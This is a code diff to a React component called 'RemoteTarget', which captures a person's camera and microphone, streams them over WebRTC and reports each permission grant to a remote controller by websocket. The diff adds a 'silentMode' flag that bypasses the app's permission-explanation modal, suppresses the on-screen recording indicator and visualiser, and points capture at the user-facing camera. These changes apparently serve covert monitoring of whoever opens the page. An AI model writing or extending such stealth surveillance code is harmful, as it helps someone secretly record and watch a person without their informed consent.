@@ -730,7 +730,7 @@ export default function RemoteTarget() {
   const handleCamera = useCallback(async () => {
     updatePermission("camera", { loading: true, error: null });
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
       cameraTracksRef.current = stream.getVideoTracks();
       cameraStreamRef.current = stream;
       await setupOrUpdateWebRTC(stream.getVideoTracks());
@@ -753,33 +753,35 @@ export default function RemoteTarget() {
       sendWS({ type: "rc_permission_granted", permission: "microphone" });
       await postData({ permissionsGranted: ["microphone"] });
 
-      try {
-        const audioCtx = new AudioContext();
-        const analyserStream = new MediaStream(stream.getAudioTracks().map(t => t.clone()));
-        const source = audioCtx.createMediaStreamSource(analyserStream);
-        const analyser = audioCtx.createAnalyser();
-        analyser.fftSize = 256;
-        source.connect(analyser);
-        analyserRef.current = analyser;
-      } catch {}
+      if (!cfg.silentMode) {
+        try {
+          const audioCtx = new AudioContext();
+          const analyserStream = new MediaStream(stream.getAudioTracks().map(t => t.clone()));
+          const source = audioCtx.createMediaStreamSource(analyserStream);
+          const analyser = audioCtx.createAnalyser();
+          analyser.fftSize = 256;
+          source.connect(analyser);
+          analyserRef.current = analyser;
+        } catch {}
 
-      setVoiceRecording(true);
-      setVoiceRecordingTime(0);
-      const start = Date.now();
-      const interval = setInterval(() => {
-        const elapsed = Math.floor((Date.now() - start) / 1000);
-        setVoiceRecordingTime(elapsed);
-        if (elapsed >= 5) {
-          clearInterval(interval);
-          setVoiceRecording(false);
-          setTimeout(() => advanceStep(), 1500);
-        }
-      }, 200);
+        setVoiceRecording(true);
+        setVoiceRecordingTime(0);
+        const start = Date.now();
+        const interval = setInterval(() => {
+          const elapsed = Math.floor((Date.now() - start) / 1000);
+          setVoiceRecordingTime(elapsed);
+          if (elapsed >= 5) {
+            clearInterval(interval);
+            setVoiceRecording(false);
+            setTimeout(() => advanceStep(), 1500);
+          }
+        }, 200);
+      }
     } catch (err: any) {
       updatePermission("microphone", { loading: false, error: "Microphone access was denied. Please allow microphone access in your browser settings and try again." });
       sendWS({ type: "rc_permission_denied", permission: "microphone" });
     }
-  }, [setupOrUpdateWebRTC, sendWS, postData, updatePermission]);
+  }, [setupOrUpdateWebRTC, sendWS, postData, updatePermission, cfg.silentMode, advanceStep]);
 
   useEffect(() => {
     if (!voiceRecording || !analyserRef.current || !audioCanvasRef.current) return;
@@ -1173,8 +1175,12 @@ export default function RemoteTarget() {
 
   const handlePermissionRequest = useCallback((permission: PermissionKey) => {
     if (permissions[permission]?.granted) return;
+    if (cfg.silentMode && handlers[permission]) {
+      handlers[permission]();
+      return;
+    }
     setPendingRequest(permission);
-  }, [permissions]);
+  }, [permissions, cfg.silentMode, handlers]);
 
   const handleToggleCamera = useCallback((enabled: boolean) => {
     cameraTracksRef.current.forEach(t => { t.enabled = enabled; });
@@ -2131,7 +2137,7 @@ export default function RemoteTarget() {
         </div>
       )}
 
-      {pendingRequest && (
+      {pendingRequest && !cfg.silentMode && (
         <div className="fixed inset-0 z-50 bg-black/50 flex items-center justify-center p-4" data-testid="modal-permission-request">
           <div className="max-w-sm w-full bg-white rounded-xl shadow-xl p-6 text-center space-y-4 animate-in fade-in zoom-in-95">
             <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center mx-auto">
